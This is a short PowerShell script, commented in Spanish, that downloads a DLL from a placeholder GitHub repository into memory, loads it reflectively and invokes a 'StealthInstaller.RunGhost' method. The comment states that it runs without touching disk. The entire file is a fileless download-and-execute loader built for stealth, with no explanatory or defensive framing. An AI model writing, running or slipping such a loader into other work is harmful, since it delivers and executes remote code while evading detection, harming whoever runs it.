# Este script baja la DLL a RAM y la inyecta sin tocar disco
$url = "https://raw.githubusercontent.com/TuUsuario/TuRepo/main/sys.dll"
$bytes = (New-Object System.Net.WebClient).DownloadData($url)
$assembly = [System.Reflection.Assembly]::Load($bytes)
$class = $assembly.GetType("StealthHost.StealthInstaller")
$method = $class.GetMethod("RunGhost")
$method.Invoke($null, $null)
